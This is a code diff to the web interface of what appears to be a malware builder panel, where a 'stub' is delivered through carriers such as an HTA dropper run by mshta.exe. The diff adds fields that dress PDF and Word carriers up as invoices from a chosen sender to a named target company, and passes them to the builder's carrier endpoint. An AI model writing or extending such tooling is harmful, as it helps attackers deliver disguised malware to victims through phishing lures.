@@ -555,6 +555,33 @@ function renderBuilder() {
     The stub must already be built (see builder above). Carrier delivery method is detected by the
     parent-process telemetry in the stub.
   </p>
+
+  <div style="background:var(--bg);border:1px solid var(--bg3);border-radius:8px;padding:12px;display:flex;flex-direction:column;gap:8px">
+    <div style="font-size:11px;font-weight:600;color:var(--light)">&#128196; PDF / Word document customisation</div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
+      <div>
+        <label style="font-size:10px;color:var(--muted);display:block;margin-bottom:3px">From (sender company)</label>
+        <input id="pdf-from" type="text" value="Nexus Solutions Ltd."
+          style="width:100%;background:var(--bg2);border:1px solid var(--bg3);border-radius:6px;color:var(--text);font-size:12px;padding:6px 9px;outline:none">
+      </div>
+      <div>
+        <label style="font-size:10px;color:var(--muted);display:block;margin-bottom:3px">Bill To (target company)</label>
+        <input id="pdf-to" type="text" value="Acme Corporation"
+          style="width:100%;background:var(--bg2);border:1px solid var(--bg3);border-radius:6px;color:var(--text);font-size:12px;padding:6px 9px;outline:none">
+      </div>
+      <div>
+        <label style="font-size:10px;color:var(--muted);display:block;margin-bottom:3px">Document filename (no extension)</label>
+        <input id="pdf-filename" type="text" value="Invoice_Q4-2024"
+          style="width:100%;background:var(--bg2);border:1px solid var(--bg3);border-radius:6px;color:var(--text);font-size:12px;padding:6px 9px;outline:none">
+      </div>
+      <div>
+        <label style="font-size:10px;color:var(--muted);display:block;margin-bottom:3px">Footer note (optional)</label>
+        <input id="pdf-note" type="text" placeholder="e.g. For internal review only"
+          style="width:100%;background:var(--bg2);border:1px solid var(--bg3);border-radius:6px;color:var(--text);font-size:12px;padding:6px 9px;outline:none">
+      </div>
+    </div>
+  </div>
+
   <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:8px;margin-top:4px">
     <button class="btn btn-sec" onclick="downloadCarrier('hta')" style="font-size:12px;padding:9px 10px">
       &#128196; HTA Dropper<br><span style="font-size:10px;color:var(--muted)">mshta.exe</span>
@@ -819,7 +846,19 @@ function doCompile() {
 
 async function downloadCarrier(type) {
   try {
-    const r = await fetch(API_BASE + '/api/builder/carrier?type=' + type, { credentials: 'include' });
+    const params = new URLSearchParams({ type });
+    // Attach PDF customisation fields for document-based carriers
+    if (['pdf','pdfexec','word'].includes(type)) {
+      const from     = document.getElementById('pdf-from')?.value.trim();
+      const to       = document.getElementById('pdf-to')?.value.trim();
+      const filename = document.getElementById('pdf-filename')?.value.trim();
+      const note     = document.getElementById('pdf-note')?.value.trim();
+      if (from)     params.set('pdf_from', from);
+      if (to)       params.set('pdf_to', to);
+      if (filename) params.set('pdf_filename', filename);
+      if (note)     params.set('pdf_note', note);
+    }
+    const r = await fetch(API_BASE + '/api/builder/carrier?' + params.toString(), { credentials: 'include' });
     if (!r.ok) { const e = await r.json().catch(()=>({error:r.statusText})); alert('Carrier error: ' + (e.error||r.statusText)); return; }
     const blob = await r.blob();
     const cd   = r.headers.get('content-disposition') || '';
